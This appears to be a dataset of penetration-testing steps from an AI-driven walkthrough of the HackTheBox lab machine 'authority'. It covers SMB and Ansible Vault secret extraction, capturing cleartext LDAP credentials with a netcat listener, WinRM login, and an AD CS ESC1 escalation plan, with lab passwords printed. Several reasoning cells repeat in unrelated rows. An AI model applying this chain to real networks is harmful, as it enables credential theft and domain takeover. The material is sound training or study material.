       1.3.4 Exploit LDAP Tester - {Findings: A netcat (nc) listener was set up on port 389. An unknown source with IP address 10.10.11.222 connected to the listener on IP 10.10.14.20. Active Directory credentials were obtained: username - svc_ldap, password - ldap_1n_th3_cle4r!. The user svc_ldap belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)
       1.5.3 Explore ""Development"" share contents - {Findings: The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box. A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory was examined as the most likely target. The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed} - (completed)
       1.5.4 Further Explore ""PWM"" directory - {Findings: The file 'defaults/main.yml' contains configuration variables for the PWM (Password Management) tool. The PWM hostname is set as 'authority.htb.corp'. The PWM http and https ports are set to be variable. The PWM https is enabled. SSL requirement for PWM is set to false. The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault. To decrypt these secrets, the correct Ansible Vault password is required} - (completed)
       1.5.5 Crack the hashes and extract the passwords - {Findings: Three encrypted files (vault1, vault2, vault3) were successfully decrypted using Ansible Vault. The decrypted content of vault1 is 'svc_pwm', which appears to be a username. The decrypted content of vault2 is 'pwm_@dm!N_!23', which appears to be a password. The decrypted content of vault3 is 'DevT3st@123', which also appears to be a password} - (completed)
       1.5.6 Login to the PWM login panel using the revealed credentials - {Findings: Successful login was achieved on the PWM (Password Management) login panel} - (completed)",Configure the LDAP teseting to probe our machine,"1. The selected step is to exploit the identified vulnerabilities. In this case, the vulnerability lies in the LDAP tester feature of the webpage. The feature allows testing an LDAP connection by probing an IP address. This can be exploited by configuring the LDAP tester to probe the attacker's machine.

2. The chain-of-thoughts leading to this step starts with the successful login to the PWM login panel using the decrypted credentials. This indicates that the PWM service uses LDAP for authentication. LDAP is known to send credentials in cleartext over the network.

3. The next link in the chain is the fact that the webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address. This feature can be exploited by configuring it to probe our machine.

4. The final link in the chain is to use Netcat to listen on the attacker's machine. Netcat is a networking utility that can read and write data across network connections. By having Netcat listen on the attacker's machine, it can capture the network traffic sent by the LDAP tester, which potentially includes the cleartext credentials.

5. Therefore, the logical step is to exploit the identified vulnerability by configuring the LDAP tester to probe the attacker's machine and use Netcat to listen for the incoming network traffic. This could potentially allow the attacker to capture the cleartext credentials and gain further access to the system.","A netcat (nc) listener was set up on port 389. An unknown source with IP address 10.10.11.222 connected to the listener on IP 10.10.14.20. Active Directory credentials were obtained: username - svc_ldap, password - ldap_1n_th3_cle4r!. The user svc_ldap belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain.",Use the revealed credentials to login to the Active Directory,"1. The intended task of the previous step was to exploit the LDAP tester feature of the webpage by setting up a netcat listener and tricking the LDAP tester to probe our machine. This task was successfully achieved.

2. The key findings from this step are the Active Directory credentials: username - svc_ldap, password - ldap_1n_th3_cle4r!. These credentials were obtained when an unknown source with IP address 10.10.11.222 connected to the listener on IP 10.10.14.20. The user svc_ldap belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain. These credentials can potentially be used to authenticate to other services in the authority.htb domain.

3. Given these findings, the logical next step is to use these credentials to attempt to login to the Active Directory. Active Directory is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services. If successful, this could provide further access to the system and potentially lead to the discovery of additional vulnerabilities or sensitive information. Therefore, it makes sense to move forward with this strategy.",Exploit the selected exploitations,"1. The selected step is to exploit the identified vulnerabilities. In this case, the vulnerability lies in the LDAP tester feature of the webpage. The feature allows testing an LDAP connection by probing an IP address. This can be exploited by configuring the LDAP tester to probe the attacker's machine.

2. The chain-of-thoughts leading to this step starts with the successful login to the PWM login panel using the decrypted credentials. This indicates that the PWM service uses LDAP for authentication. LDAP is known to send credentials in cleartext over the network.

3. The next link in the chain is the fact that the webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address. This feature can be exploited by configuring it to probe our machine.

4. The final link in the chain is to use Netcat to listen on the attacker's machine. Netcat is a networking utility that can read and write data across network connections. By having Netcat listen on the attacker's machine, it can capture the network traffic sent by the LDAP tester, which potentially includes the cleartext credentials.

5. Therefore, the logical step is to exploit the identified vulnerability by configuring the LDAP tester to probe the attacker's machine and use Netcat to listen for the incoming network traffic. This could potentially allow the attacker to capture the cleartext credentials and gain further access to the system.",{'Netcat': 'Listen for incoming network traffic from the LDAP tester.'}
authority,"Here is the updated Penetration Testing Tree (PTT):

1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services, The webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address} - (completed)
       1.3.4 Exploit LDAP Tester - {Findings: A netcat (nc) listener was set up on port 389. An unknown source with IP address 10.10.11.222 connected to the listener on IP 10.10.14.20. Active Directory credentials were obtained: username - svc_ldap, password - ldap_1n_th3_cle4r!. The user svc_ldap belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain} - (completed)
       1.3.5 Login to the Active Directory using the revealed credentials - {Findings: The tool evil-winrm was successfully used to log into the active directory} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)
       1.5.3 Explore ""Development"" share contents - {Findings: The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box. A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory was examined as the most likely target. The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed} - (completed)
       1.5.4 Further Explore ""PWM"" directory - {Findings: The file 'defaults/main.yml' contains configuration variables for the PWM (Password Management) tool. The PWM hostname is set as 'authority.htb.corp'. The PWM http and https ports are set to be variable. The PWM https is enabled. SSL requirement for PWM is set to false. The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault. To decrypt these secrets, the correct Ansible Vault password is required} - (completed)
       1.5.5 Crack the hashes and extract the passwords - {Findings: Three encrypted files (vault1, vault2, vault3) were successfully decrypted using Ansible Vault. The decrypted content of vault1 is 'svc_pwm', which appears to be a username. The decrypted content of vault2 is 'pwm_@dm!N_!23', which appears to be a password. The decrypted content of vault3 is 'DevT3st@123', which also appears to be a password} - (completed)
       1.5.6 Login to the PWM login panel using the revealed credentials - {Findings: Successful login was achieved on the PWM (Password Management) login panel} - (completed)",Use the revealed credentials to login to the Active Directory,"1. The selected step is to exploit the identified vulnerabilities. In this case, the vulnerability lies in the LDAP tester feature of the webpage. The feature allows testing an LDAP connection by probing an IP address. This can be exploited by configuring the LDAP tester to probe the attacker's machine.

2. The chain-of-thoughts leading to this step starts with the successful login to the PWM login panel using the decrypted credentials. This indicates that the PWM service uses LDAP for authentication. LDAP is known to send credentials in cleartext over the network.

3. The next link in the chain is the fact that the webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address. This feature can be exploited by configuring it to probe our machine.

4. The final link in the chain is to use Netcat to listen on the attacker's machine. Netcat is a networking utility that can read and write data across network connections. By having Netcat listen on the attacker's machine, it can capture the network traffic sent by the LDAP tester, which potentially includes the cleartext credentials.

5. Therefore, the logical step is to exploit the identified vulnerability by configuring the LDAP tester to probe the attacker's machine and use Netcat to listen for the incoming network traffic. This could potentially allow the attacker to capture the cleartext credentials and gain further access to the system.",The tool evil-winrm was successfully used to log into the active directory.,Enumerate the Active Directory to find more information for privilege escalation,"1. The intended task of the previous step was to use the revealed credentials to log into the Active Directory. This task was successfully achieved using the tool evil-winrm.

2. The key finding from this step is that we have successfully authenticated to the Active Directory as the user svc_ldap. This user belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain. This indicates that this user account may have elevated privileges or access to sensitive information within the Active Directory.

3. Given this finding, the logical next step is to gather information from the Active Directory that could potentially be used to escalate privileges. Privilege escalation is when a user gets access to more resources or functionality than they are normally allowed, and such elevations or changes should be controlled in a secure manner. In this case, since we have authenticated as a service account, there may be opportunities to escalate our privileges due to misconfigurations or vulnerabilities associated with this account or the services it has access to. Therefore, it makes sense to move forward with this strategy.","Explore the suspicious files, commands and create a summary of the findings.","1. The selected step is to explore the suspicious files, commands and create a summary of the findings. This is an essential step in the penetration testing process as it allows us to identify potential vulnerabilities or misconfigurations that could be exploited.

2. The chain-of-thoughts leading to this step starts with the successful login to the Active Directory using the revealed credentials. This indicates that we have authenticated access to the system and can potentially explore it further.

3. The next link in the chain is the fact that the user svc_ldap belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain. Service accounts often have elevated privileges or access to sensitive information, which can potentially be exploited.

4. The final link in the chain is the suggestion to use certip to check any vulnerable AD certificates. Certificates are a key part of the security infrastructure and misconfigured or vulnerable certificates can often be exploited to gain further access or escalate privileges.

5. Therefore, the logical step is to explore the Active Directory, focusing on suspicious files, commands, and AD certificates. This could potentially reveal further vulnerabilities or misconfigurations that can be exploited, allowing us to escalate our privileges or gain further access to the system.","{'Interactive CLI': 'Explore suspicious files and commands in the Active Directory.', 'Google search': 'Research potential vulnerabilities related to AD certificates.'}"
authority,"Here is the updated Penetration Testing Tree (PTT):

1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Findings: Host IP: 10.129.229.56, Open Ports: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 636/tcp, 3268/tcp, 3269/tcp, 445/tcp, 464/tcp, 593/tcp, 8443/tcp} - (completed)
       1.3.2 Determine the services and versions on each open port - {Findings: Port 53/tcp: domain (Simple DNS Plus), Port 80/tcp: http (Microsoft IIS httpd 10.0), Port 88/tcp: kerberos-sec (Microsoft Windows Kerberos), Port 135/tcp: msrpc (Microsoft Windows RPC), Port 139/tcp: netbios-ssn (Microsoft Windows netbios-ssn), Port 389/tcp, 636/tcp, 3268/tcp, 3269/tcp: ldap/ssl/ldap (Microsoft Windows Active Directory LDAP), Port 445/tcp: microsoft-ds?, Port 464/tcp: kpasswd5?, Port 593/tcp: ncacn_http (Microsoft Windows RPC over HTTP 1.0), Port 8443/tcp: ssl/https-alt} - (completed)
       1.3.3 Enumerate HTTP service - {Findings: The webpage is running Windows Internet Information Services, The webpage has a feature named ""Test LDAP Profile"" button, which allows testing an LDAP connection by probing an IP address} - (completed)
       1.3.4 Exploit LDAP Tester - {Findings: A netcat (nc) listener was set up on port 389. An unknown source with IP address 10.10.11.222 connected to the listener on IP 10.10.14.20. Active Directory credentials were obtained: username - svc_ldap, password - ldap_1n_th3_cle4r!. The user svc_ldap belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain} - (completed)
       1.3.5 Login to the Active Directory using the revealed credentials - {Findings: The tool evil-winrm was successfully used to log into the active directory} - (completed)
       1.3.6 Explore the Active Directory and Analyze Certificates - {Findings: The tool certipy v4.8.2 was used to find certificate templates and authorities. It found 37 certificate templates and 1 certificate authority. Among these, 13 certificate templates were enabled. The tool tried to get CA configuration for 'AUTHORITY-CA'. A specific template named 'CorpVPN' was found to be enabled and allows client authentication. The enrollee supplies the subject. There are several principals who have write access. A vulnerability was found: 'AUTHORITY.HTB\\Domain Computers' can enroll, the enrollee supplies the subject, and the template allows client authentication. The user svc_ldap@authority.htb was used for this operation with the password 'ldap_1n_th3_cle4r!' and the dc-ip was 10.10.11.222} - (completed)
   1.4 Target IP: 10.129.229.56 - {Findings: The host is identified as ""AUTHORITY"" running Microsoft Windows, Multiple LDAP services found with SSL certificates, all having the same Subject Alternative Name: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB, The SSL certificates are valid from 2022-08-09 to 2024-08-09, The web server on port 80 has potentially risky HTTP methods available: TRACE, The port 8443/tcp service doesn't have a title and its SSL certificate is valid from 2025-08-31 to 2027-09-02, Message signing enabled and required for smb2-security-mode, The detected time skew is 4 hours, 43 seconds, Date of scan: 2025-09-02T09:48:47, The scan was performed on 1 IP address, with 1 host found to be up, Total scan duration: 269.09 seconds} - (completed)
   1.5 SMB Enumeration - [completed]
       1.5.1 Enumerate SMB shares - {Findings: SMB enumeration revealed both standard and non-standard shares. Standard shares found are ADMIN$, C$, IPC$, NETLOGON, and SYSVOL. Non-standard shares found are ""Department Shares"" and ""Development"". The target IP for SMB enumeration is 10.10.11.222. SMB1 is disabled, no workgroup available} - (completed)
       1.5.2 Enumerate ""Development"" share - {Findings: NT_STATUS_ACCESS_DENIED was received for all shares except for the ""Development"" share. The ""Development"" share was accessible and its contents were listed. The ""Development"" share contains a directory named ""Automation"". The ""Automation"" directory was downloaded recursively to a local directory for further examination. The ""Automation"" directory appears to contain Ansible playbook files. The target IP for SMB client is 10.10.11.222} - (completed)
       1.5.3 Explore ""Development"" share contents - {Findings: The ""Automation"" directory contains Ansible playbooks, possibly used for configuration on the target box. A share named ""ADCS"" was found, suggesting that Active Directory Certificate Services (AD CS) might be installed on the target. The directory structure includes ""Ansible"" with subdirectories ""ADCS"", ""LDAP"", ""PWM"", and ""SHARE"". The ""PWM"" directory was examined as the most likely target. The ""PWM"" directory contains ansible configuration files and templates, including a 'tomcat-users.xml.j2' file. The 'tomcat-users.xml.j2' file contains two passwords, but they do not work for PWM and the Tomcat manager is not exposed} - (completed)
       1.5.4 Further Explore ""PWM"" directory - {Findings: The file 'defaults/main.yml' contains configuration variables for the PWM (Password Management) tool. The PWM hostname is set as 'authority.htb.corp'. The PWM http and https ports are set to be variable. The PWM https is enabled. SSL requirement for PWM is set to false. The PWM admin login, PWM admin password, and LDAP admin password are encrypted using Ansible Vault. To decrypt these secrets, the correct Ansible Vault password is required} - (completed)
       1.5.5 Crack the hashes and extract the passwords - {Findings: Three encrypted files (vault1, vault2, vault3) were successfully decrypted using Ansible Vault. The decrypted content of vault1 is 'svc_pwm', which appears to be a username. The decrypted content of vault2 is 'pwm_@dm!N_!23', which appears to be a password. The decrypted content of vault3 is 'DevT3st@123', which also appears to be a password} - (completed)
       1.5.6 Login to the PWM login panel using the revealed credentials - {Findings: Successful login was achieved on the PWM (Password Management) login panel} - (completed)",,"1. The selected step is to explore the suspicious files, commands and create a summary of the findings. This is an essential step in the penetration testing process as it allows us to identify potential vulnerabilities or misconfigurations that could be exploited.

2. The chain-of-thoughts leading to this step starts with the successful login to the Active Directory using the revealed credentials. This indicates that we have authenticated access to the system and can potentially explore it further.

3. The next link in the chain is the fact that the user svc_ldap belongs to the Service Accounts group under the CORP organizational unit in the authority.htb domain. Service accounts often have elevated privileges or access to sensitive information, which can potentially be exploited.

4. The final link in the chain is the suggestion to use certip to check any vulnerable AD certificates. Certificates are a key part of the security infrastructure and misconfigured or vulnerable certificates can often be exploited to gain further access or escalate privileges.

5. Therefore, the logical step is to explore the Active Directory, focusing on suspicious files, commands, and AD certificates. This could potentially reveal further vulnerabilities or misconfigurations that can be exploited, allowing us to escalate our privileges or gain further access to the system.","The tool certipy v4.8.2 was used to find certificate templates and authorities. It found 37 certificate templates and 1 certificate authority. Among these, 13 certificate templates were enabled. The tool tried to get CA configuration for 'AUTHORITY-CA'. A specific template named 'CorpVPN' was found to be enabled and allows client authentication. The enrollee supplies the subject. There are several principals who have write access. A vulnerability was found: 'AUTHORITY.HTB\\Domain Computers' can enroll, the enrollee supplies the subject, and the template allows client authentication. The user svc_ldap@authority.htb was used for this operation with the password 'ldap_1n_th3_cle4r!' and the dc-ip was 10.10.11.222.",Add a computer account the active directory,"1. The intended task of the previous step was to explore the Active Directory and analyze the certificates. This task was successfully achieved using the tool certipy v4.8.2. 

2. The key findings from this step are that it found 37 certificate templates and 1 certificate authority. Among these, 13 certificate templates were enabled. A specific template named 'CorpVPN' was found to be enabled and allows client authentication. A vulnerability was found: 'AUTHORITY.HTB\\Domain Computers' can enroll, the enrollee supplies the subject, and the template allows client authentication. 

3. Given these findings, it is clear that there is a potential vulnerability in the 'CorpVPN' certificate template. The fact that all domain computers can enroll and the enrollee supplies the subject, indicates that there is potential for abuse. This is known as the ESC1 vulnerability. The logical next step is to add a computer account to the Active Directory. By adding a computer account, we can enroll it for a certificate using the 'CorpVPN' template and potentially exploit the ESC1 vulnerability to escalate our privileges or gain further access to the system. Therefore, it makes sense to move forward with this strategy.",Exploit the selected exploitations,"1. The selected step is to exploit the identified vulnerabilities, specifically the ESC1 vulnerability in the 'CorpVPN' certificate template.

2. The chain-of-thoughts leading to this step begins with the successful exploration of the Active Directory and analysis of certificates. This exploration revealed a vulnerability in the 'CorpVPN' certificate template, which allows all domain computers to enroll and the enrollee supplies the subject. 

3. The next link in the chain is the strategy to add a computer account to the Active Directory. Adding a computer account provides an opportunity to enroll it for a certificate using the 'CorpVPN' template. 

4. The final link in the chain is the exploitation of the identified vulnerability. Here, the aim is to add a new user to the Active Directory and request a certificate specifying the built-in domain Administrator account as the Subject Alternative Name (SAN). The SAN is an extension to X.509 that allows various values to be associated with a security certificate. In this case, associating the new user with the domain Administrator account could potentially allow us to escalate our privileges or gain further access to the system.

5. Therefore, the logical step is to exploit the identified vulnerability by adding a new user to the Active Directory, requesting a certificate for this user, and specifying the built-in domain Administrator account as the SAN. This could potentially allow us to escalate our privileges or gain further access to the system.","{'Metasploit': ""Exploit the ESC1 vulnerability in the 'CorpVPN' certificate template by adding a new user to Active Directory and requesting a certificate with the domain Administrator account as the SAN.""}"
